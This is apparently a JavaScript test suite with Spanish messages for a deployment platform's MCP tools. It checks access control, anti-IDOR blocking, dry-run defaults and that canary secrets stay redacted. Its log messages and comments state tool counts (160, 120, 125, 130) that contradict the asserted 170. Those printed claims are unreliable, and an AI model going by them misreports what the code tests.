    assert.ok(!JSON.stringify(mcpServer.getAuditLog(1)[0]).includes('sk_live_shadow_never_store_999'), 'Authorization jamás puede filtrarse al auditLog MCP');

    // Regression scenario -> BLOCK_CUTOVER
    candidateMode = 'broken';
    const failReplay = await mcpServer.executeTool('culkibo_shadow_replay', {
      projectId: projC6.id,
      baselineUrl: baseUrl,
      candidateUrl: candUrl,
      requests: [{ method: 'GET', path: '/api/items' }],
      allowLoopback: true
    });
    assert.strictEqual(failReplay.isError, false);
    assert.strictEqual(failReplay.structuredContent.pass, false);
    assert.strictEqual(failReplay.structuredContent.verdict, 'BLOCK_CUTOVER');
    assert.ok(failReplay.structuredContent.blockers.some((b) => b.code === 'REGRESSION_5XX'));

    const histReplay = await mcpServer.executeTool('culkibo_shadow_replay', { action: 'history', projectId: projC6.id });
    assert.strictEqual(histReplay.isError, false);
    assert.ok(histReplay.structuredContent.count >= 2);
    console.log('  ✓ culkibo_shadow_replay verificado (PROMOTE, BLOCK_CUTOVER 5xx, redacción Authorization, SSRF block y anti-IDOR)');

    // 2. culkibo_time_machine: create -> mutate -> diff -> default dryRun restore (0 mutations) -> dryRun:false restore + safety checkpoint + RBAC
    const idorTm = await mcpServer.executeTool('culkibo_time_machine', {
      action: 'list',
      projectId: projOther.id
    }, { auth: scopedDevAuth });
    assert.strictEqual(idorTm.isError, true);
    assert.strictEqual(JSON.parse(idorTm.content[0].text).code, 'FORBIDDEN');

    const cp1Res = await mcpServer.executeTool('culkibo_time_machine', {
      action: 'create',
      projectId: projC6.id,
      label: 'pre-upgrade-v1'
    }, { auth: scopedDevAuth });
    assert.strictEqual(cp1Res.isError, false);
    const cp1Id = cp1Res.structuredContent.checkpoint.id;
    assert.ok(typeof cp1Id === 'string' && cp1Id.startsWith('tm_'));
    assert.ok(!JSON.stringify(cp1Res.structuredContent).includes('sk_live_c6_never_leak_999999'), 'Time-Machine jamás puede devolver secretos en claro');

    // Mutate project state
    projectManager.update(projC6.id, {
      description: 'Broken v2 mutation',
      memoryMb: 2048,
      envVars: { API_MODE: 'v2-broken', EXTRA_FLAG: '1' }
    });

    const cp2Res = await mcpServer.executeTool('culkibo_time_machine', {
      action: 'create',
      projectId: projC6.id,
      label: 'post-upgrade-v2'
    }, { auth: scopedDevAuth });
    assert.strictEqual(cp2Res.isError, false);
    const cp2Id = cp2Res.structuredContent.checkpoint.id;

    const listTm = await mcpServer.executeTool('culkibo_time_machine', { action: 'list', projectId: projC6.id });
    assert.strictEqual(listTm.isError, false);
    assert.strictEqual(listTm.structuredContent.count, 2);

    const diffTm = await mcpServer.executeTool('culkibo_time_machine', {
      action: 'diff',
      projectId: projC6.id,
      fromId: cp1Id,
      toId: cp2Id
    });
    assert.strictEqual(diffTm.isError, false);
    assert.ok(diffTm.structuredContent.diff.hasChanges === true);
    assert.ok(diffTm.structuredContent.diff.env.added.includes('EXTRA_FLAG'));

    // Restore omitting dryRun -> defaults to dryRun: true (0 mutations!)
    const defaultDryRestore = await mcpServer.executeTool('culkibo_time_machine', {
      action: 'restore',
      projectId: projC6.id,
      checkpointId: cp1Id
    });
    assert.strictEqual(defaultDryRestore.isError, false);
    assert.strictEqual(defaultDryRestore.structuredContent.dryRun, true);
    assert.strictEqual(defaultDryRestore.structuredContent.restored, false);
    assert.strictEqual(projectManager.getById(projC6.id).description, 'Broken v2 mutation', 'restore sin dryRun:false NUNCA debe mutar estado');

    // Restore with explicit dryRun: true -> previewToolPlan (0 mutations!)
    const explicitDryRestore = await mcpServer.executeTool('culkibo_time_machine', {
      action: 'restore',
      projectId: projC6.id,
      checkpointId: cp1Id,
      dryRun: true
    });
    assert.strictEqual(explicitDryRestore.isError, false);
    assert.strictEqual(explicitDryRestore.structuredContent.dryRun, true);
    assert.strictEqual(explicitDryRestore.structuredContent.wouldExecute, true);
    assert.strictEqual(projectManager.getById(projC6.id).description, 'Broken v2 mutation');

    // Real restore with dryRun: false -> restores v1 + creates safety checkpoint!
    const realRestore = await mcpServer.executeTool('culkibo_time_machine', {
      action: 'restore',
      projectId: projC6.id,
      checkpointId: cp1Id,
      dryRun: false
    });
    assert.strictEqual(realRestore.isError, false);
    assert.strictEqual(realRestore.structuredContent.dryRun, false);
    assert.strictEqual(realRestore.structuredContent.restored, true);
    assert.ok(typeof realRestore.structuredContent.safetyCheckpointId === 'string' && realRestore.structuredContent.safetyCheckpointId.startsWith('tm_'));
    assert.strictEqual(projectManager.getById(projC6.id).description, 'Initial v1 description');
    assert.strictEqual(projectManager.getById(projC6.id).envVars.API_MODE, 'v1');
    console.log('  ✓ culkibo_time_machine verificado (create/list/diff, default dryRun=true, atomic restore + safety checkpoint y anti-IDOR)');

    // 3. culkibo_finops_report (RO, RBAC-scoped projects + compareCloudCosts)
    const finopsViewer = await mcpServer.executeTool('culkibo_finops_report', {
      apps: 6,
      databases: 2
    }, { auth: viewerAuth });
    assert.strictEqual(finopsViewer.isError, false);
    assert.strictEqual(finopsViewer.structuredContent.scopedProjectsCount, 1, 'culkibo_finops_report debe respetar ACL de proyectos del viewer');
    assert.ok(finopsViewer.structuredContent.comparison.annualSavingsUsd > 0);
    assert.ok(finopsViewer.structuredContent.comparison.savingsPct > 0);
    assert.ok(finopsViewer.structuredContent.analysis && Array.isArray(finopsViewer.structuredContent.analysis.recommendations));
    console.log(`  ✓ culkibo_finops_report verificado (RO RBAC scopedProjects=1, ahorro anual $${finopsViewer.structuredContent.comparison.annualSavingsUsd}/yr = ${finopsViewer.structuredContent.comparison.savingsPct}%)`);

    // 4. Verify ?profile=core achieves >=82% token savings at 160 tools
    const allBytes = Buffer.byteLength(JSON.stringify(mcpServer.getToolsForPrincipal(null, { profile: 'all' })), 'utf8');
    const coreSubset = mcpServer.getToolsForPrincipal(null, { profile: 'core' });
    const coreBytes = Buffer.byteLength(JSON.stringify(coreSubset), 'utf8');
    const pctSaved = Math.round((1 - coreBytes / allBytes) * 1000) / 10;
    assert.strictEqual(mcpServer.getToolsDefinition().length, 170);
    assert.strictEqual(coreSubset.length, 17);
    assert.ok(pctSaved >= 83, `?profile=core debe ahorrar >=83% tokens en 160 tools (actual: ${pctSaved}%)`);
    console.log(`  ✓ ?profile=core sobre 160 tools: ${coreSubset.length}/160 herramientas (-${pctSaved}% bytes/tokens)`);
  } finally {
    await Promise.all([
      new Promise((r) => baseSrv.close(() => r(undefined))),
      new Promise((r) => candSrv.close(() => r(undefined)))
    ]);
    projectManager.delete(projC6.id);
    projectManager.delete(projOther.id);
    await projectManager.flushToDisk();
    if (prevDataDir === undefined) delete process.env.CULKIBO_DATA_DIR;
    else process.env.CULKIBO_DATA_DIR = prevDataDir;
    resetTmCache();
    try { fs.rmSync(tmpDataRoot, { recursive: true, force: true }); } catch (e) {}
  }
}

/**
 * MCP 2026 Cycle-7: Build Auto-Healer (`culkibo_heal_build_failure`),
 * WireGuard Fleet Mesh (`culkibo_fleet_mesh`), Cron 24h Heatmap + Heartbeats (`culkibo_cron_timeline`),
 * Edge Bot-Shield + Hashcash PoW (`culkibo_edge_shield`), and `-83%+` `?profile=core` over 120 tools.
 */
async function testMcp2026Cycle7HealerMeshTimelineShield() {
  const fs = require('fs');
  const os = require('os');
  const path = require('path');
  const projectManager = require('../server/services/projectManager');
  const cronManager = require('../server/services/cronManager');
  const fleetMeshService = require('../server/services/fleetMeshService');

  const tmpDataRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'culkibo-mcp-c7-'));
  const prevDataDir = process.env.CULKIBO_DATA_DIR;
  process.env.CULKIBO_DATA_DIR = tmpDataRoot;

  const resetC7Caches = () => {
    fleetMeshService._loaded = false;
    fleetMeshService._masterKey = null;
    fleetMeshService.state = {
      version: 1,
      cidr: '10.88.0.0/24',
      interfaceName: 'wg0',
      listenPort: 51820,
      peers: Object.create(null)
    };
    if ('_heartbeatsLoaded' in cronManager) cronManager._heartbeatsLoaded = false;
    if ('_heartbeatsPath' in cronManager) cronManager._heartbeatsPath = null;
    if (Array.isArray(cronManager.heartbeats)) cronManager.heartbeats = [];
  };
  resetC7Caches();

  const projAllowed = projectManager.create({
    name: 'Cycle7 Allowed App',
    teamId: 'team_default',
    memoryMb: 512,
    envVars: { NODE_ENV: 'production' }
  });
  const projForeign = projectManager.create({
    name: 'Cycle7 Foreign App',
    teamId: 'team_default',
    memoryMb: 512
  });

  const viewerAuth = {
    ok: true,
    method: 'api_token',
    principal: { userId: 'usr_c7_viewer', role: 'viewer', teamId: 'team_default', projectIds: [projAllowed.id], scopes: ['*'] }
  };
  const scopedDevAuth = {
    ok: true,
    method: 'api_token',
    principal: { userId: 'usr_c7_dev', role: 'developer', teamId: 'team_default', projectIds: [projAllowed.id], scopes: ['*'] }
  };
  const unscopedDevAuth = {
    ok: true,
    method: 'api_token',
    principal: { userId: 'usr_c7_unscoped_dev', role: 'developer', teamId: 'team_default', projectIds: null, scopes: ['*'] }
  };

  /** @type {string[]} */
  const createdHbIds = [];
  /** @type {string[]} */
  const createdCronIds = [];

  try {
    // 1. culkibo_heal_build_failure (20-pattern diagnose + dryRun default + apply dryRun:false + anti-IDOR)
    const oomLogs = 'FATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory\nExit code 137';

    // Viewer blocked + scoped dev blocked on foreign project (anti-IDOR)
    const healViewer = await mcpServer.executeTool('culkibo_heal_build_failure', {
      projectId: projAllowed.id,
      logs: oomLogs
    }, { auth: viewerAuth });
    assert.strictEqual(healViewer.isError, true);
    assert.strictEqual(JSON.parse(healViewer.content[0].text).code, 'FORBIDDEN');

    const healIdor = await mcpServer.executeTool('culkibo_heal_build_failure', {
      projectId: projForeign.id,
      logs: oomLogs
    }, { auth: scopedDevAuth });
    assert.strictEqual(healIdor.isError, true);
    assert.strictEqual(JSON.parse(healIdor.content[0].text).code, 'FORBIDDEN');

    // apply: true WITHOUT dryRun: false MUST default to dryRun: true (0 mutations!)
    const healDefaultDry = await mcpServer.executeTool('culkibo_heal_build_failure', {
      projectId: projAllowed.id,
      logs: oomLogs,
      apply: true
    }, { auth: scopedDevAuth });
    assert.strictEqual(healDefaultDry.isError, false);
    assert.strictEqual(healDefaultDry.structuredContent.matched, true);
    assert.strictEqual(healDefaultDry.structuredContent.dryRun, true);
    assert.strictEqual(healDefaultDry.structuredContent.applied, false);
    assert.strictEqual(healDefaultDry.structuredContent.diagnosis.primary.code, 'NODE_HEAP_OOM');
    assert.strictEqual(projectManager.getById(projAllowed.id).memoryMb, 512, 'apply sin dryRun:false no debe mutar el proyecto');

    // previewToolPlan via explicit dryRun: true
    const healPreview = await mcpServer.executeTool('culkibo_heal_build_failure', {
      projectId: projAllowed.id,
      logs: oomLogs,
      apply: true,
      dryRun: true
    }, { auth: scopedDevAuth });
    assert.strictEqual(healPreview.isError, false);
    assert.strictEqual(healPreview.structuredContent.dryRun, true);
    assert.strictEqual(healPreview.structuredContent.wouldExecute, true);

    // Explicit apply: true + dryRun: false applies safe patch (raises memoryMb / injects NODE_OPTIONS)
    const healApplied = await mcpServer.executeTool('culkibo_heal_build_failure', {
      projectId: projAllowed.id,
      logs: oomLogs,
      apply: true,
      dryRun: false
    }, { auth: scopedDevAuth });
    assert.strictEqual(healApplied.isError, false);
    assert.strictEqual(healApplied.structuredContent.dryRun, false);
    assert.strictEqual(healApplied.structuredContent.applied, true);
    assert.ok(projectManager.getById(projAllowed.id).memoryMb > 512, 'applyHealingPlan debe incrementar memoryMb en NODE_HEAP_OOM');
    console.log('  ✓ culkibo_heal_build_failure verificado (NODE_HEAP_OOM, default dryRun=true, dryRun=false apply y anti-IDOR)');

    // 2. culkibo_fleet_mesh (admin RBAC, status/plan/rotate dryRun default, 0 private key leaks)
    const meshDevBlocked = await mcpServer.executeTool('culkibo_fleet_mesh', { action: 'status' }, { auth: unscopedDevAuth });
    assert.strictEqual(meshDevBlocked.isError, true);
    assert.strictEqual(JSON.parse(meshDevBlocked.content[0].text).code, 'FORBIDDEN');

    const meshStatus = await mcpServer.executeTool('culkibo_fleet_mesh', { action: 'status' });
    assert.strictEqual(meshStatus.isError, false);
    assert.strictEqual(meshStatus.structuredContent.cidr, '10.88.0.0/24');
    assert.strictEqual(meshStatus.structuredContent.interfaceName, 'wg0');
    assert.ok(meshStatus.structuredContent.peerCount >= 1);
    const firstPeer = meshStatus.structuredContent.peers[0];
    assert.ok(typeof firstPeer.publicKey === 'string' && firstPeer.publicKey.length === 44);
    assert.ok(!('privateKey' in firstPeer) && !('encryptedPrivateKey' in firstPeer), 'Jamás exponer claves privadas WireGuard');

    const meshPlan = await mcpServer.executeTool('culkibo_fleet_mesh', { action: 'plan' });
    assert.strictEqual(meshPlan.isError, false);
    assert.strictEqual(meshPlan.structuredContent.dryRun, true);
    assert.ok(meshPlan.structuredContent.plan && Array.isArray(meshPlan.structuredContent.plan.wgConfigs));
    assert.ok(meshPlan.structuredContent.plan.wgConfigs[0].config.includes('[REDACT_ON_API]'));

    // Rotate omitting dryRun -> defaults to dryRun: true (keyVersion unchanged!)
    const meshRotDry = await mcpServer.executeTool('culkibo_fleet_mesh', { action: 'rotate', nodeId: firstPeer.nodeId });
    assert.strictEqual(meshRotDry.isError, false);
    assert.strictEqual(meshRotDry.structuredContent.dryRun, true);
    assert.strictEqual(meshRotDry.structuredContent.rotation.rotated, false);

    // Rotate with dryRun: false -> rotates keypair & audit log redacts result
    const meshRotReal = await mcpServer.executeTool('culkibo_fleet_mesh', { action: 'rotate', nodeId: firstPeer.nodeId, dryRun: false });
    assert.strictEqual(meshRotReal.isError, false);
    assert.strictEqual(meshRotReal.structuredContent.dryRun, false);
    assert.strictEqual(meshRotReal.structuredContent.rotation.rotated, true);
    assert.notStrictEqual(meshRotReal.structuredContent.rotation.newPublicKey, firstPeer.publicKey);
    assert.strictEqual(mcpServer.getAuditLog(1)[0].resultSummary, '[resultado sensible ocultado en auditoría]');
    console.log('  ✓ culkibo_fleet_mesh verificado (RBAC admin, x25519 44-char pubkey, 0 private keys, dryRun default y rotate real)');

    // 3. culkibo_cron_timeline (RO viewer allowed, ACL-filtered crons & heartbeats, raw token redacted!)
    const c1 = cronManager.create(projAllowed.id, { name: 'Allowed Backup', schedule: '0 * * * *', mode: 'http', httpPath: '/health' });
    const c2 = cronManager.create(projForeign.id, { name: 'Foreign Secret Job', schedule: '0 * * * *', mode: 'http', httpPath: '/health' });
    if (c1?.id) createdCronIds.push(c1.id);
    if (c2?.id) createdCronIds.push(c2.id);

    const hbAllowed = cronManager.createHeartbeat({ name: 'Allowed Heartbeat', projectId: projAllowed.id, periodSec: 3600, graceSec: 300 });
    const hbForeign = cronManager.createHeartbeat({ name: 'Foreign Heartbeat', projectId: projForeign.id, periodSec: 3600, graceSec: 300 });
    createdHbIds.push(hbAllowed.id, hbForeign.id);

    const timelineViewer = await mcpServer.executeTool('culkibo_cron_timeline', { hours: 24, includeHeartbeats: true }, { auth: viewerAuth });
    assert.strictEqual(timelineViewer.isError, false);
    assert.strictEqual(timelineViewer.structuredContent.hours, 24);
    assert.strictEqual(timelineViewer.structuredContent.slots.length, 24);
    const serializedTimeline = JSON.stringify(timelineViewer.structuredContent);
    assert.ok(serializedTimeline.includes('Allowed Heartbeat'), 'Debe incluir heartbeats del proyecto autorizado');
    assert.ok(!serializedTimeline.includes('Foreign Heartbeat'), 'JAMÁS debe filtrar heartbeats de otros proyectos');
    assert.ok(!serializedTimeline.includes('Foreign Secret Job'), 'JAMÁS debe filtrar crons de otros proyectos');
    assert.ok(!serializedTimeline.includes(hbAllowed.token), 'JAMÁS debe exponer el token raw de check-in del heartbeat por culkibo_cron_timeline');
    console.log('  ✓ culkibo_cron_timeline verificado (RO viewer, 24h heatmap, ACL estricto por proyecto y redacción de token heartbeat)');

    // 4. culkibo_edge_shield (developer/admin RBAC, status, compile native Caddy v2.11 subroutes + PoW challenge)
    const shieldViewer = await mcpServer.executeTool('culkibo_edge_shield', { action: 'status' }, { auth: viewerAuth });
    assert.strictEqual(shieldViewer.isError, true);
    assert.strictEqual(JSON.parse(shieldViewer.content[0].text).code, 'FORBIDDEN');

    const shieldStatus = await mcpServer.executeTool('culkibo_edge_shield', { action: 'status' }, { auth: unscopedDevAuth });
    assert.strictEqual(shieldStatus.isError, false);
    assert.strictEqual(shieldStatus.structuredContent.status.zeroCaddyPlugins, true);

    const shieldCompile = await mcpServer.executeTool('culkibo_edge_shield', {
      action: 'compile',
      domain: 'api.acme.dev',
      powChallenge: true,
      difficulty: 4
    }, { auth: unscopedDevAuth });
    assert.strictEqual(shieldCompile.isError, false);
    assert.ok(Array.isArray(shieldCompile.structuredContent.routes) && shieldCompile.structuredContent.routes.length >= 4);

    const shieldChal = await mcpServer.executeTool('culkibo_edge_shield', {
      action: 'challenge',
      domain: 'api.acme.dev',
      difficulty: 3
    }, { auth: unscopedDevAuth });
    assert.strictEqual(shieldChal.isError, false);
    assert.strictEqual(shieldChal.structuredContent.challenge.algorithm, 'sha256');
    assert.strictEqual(shieldChal.structuredContent.challenge.difficulty, 3);
    console.log('  ✓ culkibo_edge_shield verificado (RBAC developer/admin, status, compile Caddy v2.11 + PoW y challenge SHA-256)');

    // 5. Final Cycle-7 assertion: exact 160 tools & ?profile=core 17/160 >83% reduction
    const allTools = mcpServer.getToolsForPrincipal(null, { profile: 'all' });
    const coreTools = mcpServer.getToolsForPrincipal(null, { profile: 'core' });
    const savedPct = Math.round((1 - Buffer.byteLength(JSON.stringify(coreTools), 'utf8') / Buffer.byteLength(JSON.stringify(allTools), 'utf8')) * 1000) / 10;
    assert.strictEqual(allTools.length, 170);
    assert.strictEqual(coreTools.length, 17);
    assert.ok(savedPct > 83, `?profile=core debe superar 83% de ahorro en 160 tools (actual: ${savedPct}%)`);
    console.log(`  ✓ Catálogo Cycle-7 verificado: 160 tools exactas, ?profile=core 17/160 (-${savedPct}% tokens/bytes)`);
  } finally {
    for (const cid of createdCronIds) {
      try { if (typeof cronManager.remove === 'function') cronManager.remove(cid); else if (typeof cronManager.delete === 'function') cronManager.delete(cid); } catch (e) {}
    }
    for (const hid of createdHbIds) {
      try { cronManager.deleteHeartbeat(hid); } catch (e) {}
    }
    projectManager.delete(projAllowed.id);
    projectManager.delete(projForeign.id);
    await projectManager.flushToDisk();
    if (prevDataDir === undefined) delete process.env.CULKIBO_DATA_DIR;
    else process.env.CULKIBO_DATA_DIR = prevDataDir;
    resetC7Caches();
    try { fs.rmSync(tmpDataRoot, { recursive: true, force: true }); } catch (e) {}
  }
}

/**
 * MCP 2026 Cycle-8: Autonomous Triage (`culkibo_triage_playbook`), SBOM CVE Drift (`culkibo_cve_scan`),
 * Config Drift + PgBouncer (`culkibo_drift_check`), Zero-Lock-In IaC Export (`culkibo_export_iac`),
 * Ephemeral Secret Leases & Break-Glass (`culkibo_secret_lease`), and `-84%+` `?profile=core` at 125 tools.
 */
async function testMcp2026Cycle8TriageCveDriftIacLease() {
  const fs = require('fs');
  const os = require('os');
  const path = require('path');
  const projectManager = require('../server/services/projectManager');
  const secretLeaseService = require('../server/services/secretLeaseService');

  const tmpDataRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'culkibo-mcp-c8-'));
  const prevDataDir = process.env.CULKIBO_DATA_DIR;
  process.env.CULKIBO_DATA_DIR = tmpDataRoot;

  const projA = projectManager.create({
    name: 'Cycle8 Alpha API',
    teamId: 'team_default',
    memoryMb: 512,
    containerPort: 3000,
    imageTag: 'acme/alpha:v1',
    envVars: { DATABASE_URL: 'postgres://u:CANARY_C8_SECRET_9991@127.0.0.1:5432/app', PUBLIC_ENV: 'prod' }
  });
  const projB = projectManager.create({
    name: 'Cycle8 Foreign Beta',
    teamId: 'team_default',
    memoryMb: 512,
    envVars: { FOREIGN_SECRET: 'CANARY_FOREIGN_SECRET_8822' }
  });

  const viewerAuth = {
    ok: true,
    method: 'api_token',
    principal: { userId: 'usr_c8_viewer', role: 'viewer', teamId: 'team_default', projectIds: [projA.id], scopes: ['*'] }
  };
  const scopedDevAuth = {
    ok: true,
    method: 'api_token',
    principal: { userId: 'usr_c8_dev', role: 'developer', teamId: 'team_default', projectIds: [projA.id], scopes: ['*'] }
  };

  try {
    // 1. culkibo_triage_playbook (RO viewer/dev/admin, strict project ACL, chains incident + healer + drift + offline CVE)
    const triageIdor = await mcpServer.executeTool('culkibo_triage_playbook', {
      projectId: projB.id
    }, { auth: viewerAuth });
    assert.strictEqual(triageIdor.isError, true);
    assert.strictEqual(JSON.parse(triageIdor.content[0].text).code, 'FORBIDDEN');

    const driftedInspect = {
      Config: {
        Image: 'acme/alpha:v2-manual-hotfix',
        Env: ['DATABASE_URL=redacted', 'UNDECLARED_DEBUG=1'],
        StopTimeout: 10
      },
      HostConfig: {
        Memory: 256 * 1024 * 1024,
        PortBindings: { '3000/tcp': [{ HostIp: '0.0.0.0', HostPort: '3000' }] },
        LogConfig: { Type: 'syslog' }
      }
    };
    const triageOk = await mcpServer.executeTool('culkibo_triage_playbook', {
      projectId: projA.id,
      logs: 'FATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory',
      actualInspect: driftedInspect,
      includeCveScan: true
    }, { auth: viewerAuth });
    assert.strictEqual(triageOk.isError, false);
    assert.strictEqual(triageOk.structuredContent.projectId, projA.id);
    assert.strictEqual(triageOk.structuredContent.healer.primary.code, 'NODE_HEAP_OOM');
    assert.strictEqual(triageOk.structuredContent.drift.drifted, true);
    assert.ok(triageOk.structuredContent.cve && triageOk.structuredContent.cve.ok === true);
    assert.ok(triageOk.structuredContent.rootCauses.length >= 2);
    assert.ok(triageOk.structuredContent.remediationSteps.length >= 2);
    assert.ok(!JSON.stringify(triageOk.structuredContent).includes('CANARY_C8_SECRET_9991'));
    console.log('  ✓ culkibo_triage_playbook verificado (incidente + NODE_HEAP_OOM + drift + SBOM CVE offline + anti-IDOR)');

    // 2. culkibo_cve_scan (RO viewer allowed, offline-safe default)
    const cveRes = await mcpServer.executeTool('culkibo_cve_scan', { allowNetwork: false }, { auth: viewerAuth });
    assert.strictEqual(cveRes.isError, false);
    assert.strictEqual(cveRes.structuredContent.ok, true);
    assert.ok(cveRes.structuredContent.scannedComponents > 0);
    console.log(`  ✓ culkibo_cve_scan verificado (${cveRes.structuredContent.scannedComponents} componentes SBOM, mode=${cveRes.structuredContent.mode})`);

    // 3. culkibo_drift_check (RO dev/admin, viewer blocked, anti-IDOR + PgBouncer preset)
    const driftViewerBlocked = await mcpServer.executeTool('culkibo_drift_check', { projectId: projA.id }, { auth: viewerAuth });
    assert.strictEqual(driftViewerBlocked.isError, true);
    assert.strictEqual(JSON.parse(driftViewerBlocked.content[0].text).code, 'FORBIDDEN');

    const driftIdor = await mcpServer.executeTool('culkibo_drift_check', { projectId: projB.id }, { auth: scopedDevAuth });
    assert.strictEqual(driftIdor.isError, true);
    assert.strictEqual(JSON.parse(driftIdor.content[0].text).code, 'FORBIDDEN');

    const driftOk = await mcpServer.executeTool('culkibo_drift_check', {
      projectId: projA.id,
      actualInspect: driftedInspect,
      pgbouncerPreset: { name: 'pg-pool-main', databaseName: 'app', maxPreparedStatements: 200 }
    }, { auth: scopedDevAuth });
    assert.strictEqual(driftOk.isError, false);
    assert.strictEqual(driftOk.structuredContent.drift.drifted, true);
    assert.strictEqual(driftOk.structuredContent.drift.severity, 'critical');
    assert.strictEqual(driftOk.structuredContent.pgbouncerPreset.maxPreparedStatements, 200);
    assert.ok(driftOk.structuredContent.pgbouncerPreset.pgbouncerIni.includes('pool_mode = transaction'));
    assert.ok(!JSON.stringify(driftOk.structuredContent).includes('CANARY_C8_SECRET_9991'));
    console.log('  ✓ culkibo_drift_check verificado (kamal#1790 drift critical + PgBouncer preset + RBAC/anti-IDOR)');

    // 4. culkibo_export_iac (RO dev/admin, project ACL enforced, 0 plaintext canary secrets, audit redacted)
    const iacViewerBlocked = await mcpServer.executeTool('culkibo_export_iac', {}, { auth: viewerAuth });
    assert.strictEqual(iacViewerBlocked.isError, true);
    assert.strictEqual(JSON.parse(iacViewerBlocked.content[0].text).code, 'FORBIDDEN');

    const iacIdor = await mcpServer.executeTool('culkibo_export_iac', { projectIds: [projB.id] }, { auth: scopedDevAuth });
    assert.strictEqual(iacIdor.isError, true);
    assert.strictEqual(JSON.parse(iacIdor.content[0].text).code, 'FORBIDDEN');

    const iacOk = await mcpServer.executeTool('culkibo_export_iac', { format: 'all' }, { auth: scopedDevAuth });
    assert.strictEqual(iacOk.isError, false);
    assert.strictEqual(iacOk.structuredContent.stats.projects, 1, 'culkibo_export_iac debe exportar solo proyectos del ACL del llamante');
    assert.ok(typeof iacOk.structuredContent.files['main.tf'] === 'string' && iacOk.structuredContent.files['main.tf'].includes('docker_container'));
    assert.ok(typeof iacOk.structuredContent.files['docker-compose.yml'] === 'string');
    assert.ok(typeof iacOk.structuredContent.files['.env.example'] === 'string');
    const serializedIac = JSON.stringify(iacOk.structuredContent);
    assert.ok(!serializedIac.includes('CANARY_C8_SECRET_9991'), 'IaC JAMÁS puede exportar secretos en claro');
    assert.ok(!serializedIac.includes('CANARY_FOREIGN_SECRET_8822'), 'IaC JAMÁS puede exportar proyectos ajenos');
    assert.strictEqual(mcpServer.getAuditLog(1)[0].resultSummary, '[resultado sensible ocultado en auditoría]');
    console.log('  ✓ culkibo_export_iac verificado (OpenTofu/Compose/.env.example, ACL estricto, 0 secretos en claro)');

    // 5. culkibo_secret_lease (admin RBAC, dryRun default on issue/revoke/break_glass, audit redaction, isolated CULKIBO_DATA_DIR)
    const leaseDevBlocked = await mcpServer.executeTool('culkibo_secret_lease', { action: 'list' }, { auth: scopedDevAuth });
    assert.strictEqual(leaseDevBlocked.isError, true);
    assert.strictEqual(JSON.parse(leaseDevBlocked.content[0].text).code, 'FORBIDDEN');

    // issue omitting dryRun -> safe dryRun: true (0 leases created!)
    const leaseDryIssue = await mcpServer.executeTool('culkibo_secret_lease', {
      action: 'issue',
      projectId: projA.id,
      secretKey: 'DATABASE_URL',
      ttlSec: 600
    });
    assert.strictEqual(leaseDryIssue.isError, false);
    assert.strictEqual(leaseDryIssue.structuredContent.dryRun, true);
    assert.strictEqual(leaseDryIssue.structuredContent.issued, false);

    // issue with dryRun: false -> returns one-time ckl_ token, redacted in auditLog!
    const leaseLiveIssue = await mcpServer.executeTool('culkibo_secret_lease', {
      action: 'issue',
      projectId: projA.id,
      secretKey: 'DATABASE_URL',
      ttlSec: 600,
      dryRun: false
    });
    assert.strictEqual(leaseLiveIssue.isError, false);
    assert.strictEqual(leaseLiveIssue.structuredContent.dryRun, false);
    assert.ok(typeof leaseLiveIssue.structuredContent.token === 'string' && leaseLiveIssue.structuredContent.token.startsWith('ckl_'));
    const leaseId = leaseLiveIssue.structuredContent.lease.id;
    assert.ok(!JSON.stringify(mcpServer.getAuditLog(1)[0]).includes(leaseLiveIssue.structuredContent.token), 'Token ckl_ jamás puede filtrarse al auditLog');

    // validateLease works before revoke and fails closed after revoke(dryRun: false)
    assert.strictEqual(secretLeaseService.validateLease(leaseLiveIssue.structuredContent.token).valid, true);
    const leaseRevDry = await mcpServer.executeTool('culkibo_secret_lease', { action: 'revoke', leaseId });
    assert.strictEqual(leaseRevDry.structuredContent.dryRun, true);
    assert.strictEqual(leaseRevDry.structuredContent.revoked, false);
    const leaseRevLive = await mcpServer.executeTool('culkibo_secret_lease', { action: 'revoke', leaseId, dryRun: false });
    assert.strictEqual(leaseRevLive.structuredContent.revoked, true);
    assert.strictEqual(secretLeaseService.validateLease(leaseLiveIssue.structuredContent.token).valid, false);

    // break_glass dryRun default + audit_rotation
    const bgDry = await mcpServer.executeTool('culkibo_secret_lease', {
      action: 'break_glass',
      reason: 'INC-808 emergency database failover drill',
      ttlSec: 3600
    });
    assert.strictEqual(bgDry.isError, false);
    assert.strictEqual(bgDry.structuredContent.dryRun, true);
    assert.ok(bgDry.structuredContent.wouldIssueBreakGlass.ttlSec <= 900, 'break_glass TTL debe acotarse a <=900s (15 min)');

    const rotAudit = await mcpServer.executeTool('culkibo_secret_lease', { action: 'audit_rotation', maxAgeDays: 90 });
    assert.strictEqual(rotAudit.isError, false);
    assert.ok(rotAudit.structuredContent.audit && typeof rotAudit.structuredContent.audit.totalKeys === 'number');
    console.log('  ✓ culkibo_secret_lease verificado (RBAC admin, dryRun default, ckl_ redactado, revoke fail-closed, break_glass <=15m)');

    // 6. Final Cycle-8 assertion: exact 160 tools & ?profile=core 17/160 >=84% reduction
    const all130 = mcpServer.getToolsForPrincipal(null, { profile: 'all' });
    const core17 = mcpServer.getToolsForPrincipal(null, { profile: 'core' });
    const saved130Pct = Math.round((1 - Buffer.byteLength(JSON.stringify(core17), 'utf8') / Buffer.byteLength(JSON.stringify(all130), 'utf8')) * 1000) / 10;
    assert.strictEqual(all130.length, 170);
    assert.strictEqual(core17.length, 17);
    assert.ok(saved130Pct >= 84, `?profile=core debe ahorrar >=84% tokens en 160 tools (actual: ${saved130Pct}%)`);
    console.log(`  ✓ Catálogo Cycle-8 verificado: 160 tools exactas, ?profile=core 17/160 (-${saved130Pct}% tokens/bytes)`);
  } finally {
    projectManager.delete(projA.id);
    projectManager.delete(projB.id);
    await projectManager.flushToDisk();
    if (prevDataDir === undefined) delete process.env.CULKIBO_DATA_DIR;
    else process.env.CULKIBO_DATA_DIR = prevDataDir;
    try { fs.rmSync(tmpDataRoot, { recursive: true, force: true }); } catch (e) {}
  }
}

/**
 * MCP 2026 Cycle-9: Standard-Webhooks DLQ (`culkibo_webhook_dlq`), Read-Only Live DB Studio (`culkibo_db_studio`),
 * Post-MinIO S3 Storage + SigV4 (`culkibo_s3_storage`), Agency Multi-Tenant Quotas & Billing Ledger (`culkibo_agency_ledger`),
 * Open-Core White-Label Brand (`culkibo_brand_theme`), and `-85%+` `?profile=core` at 130 tools.
 */
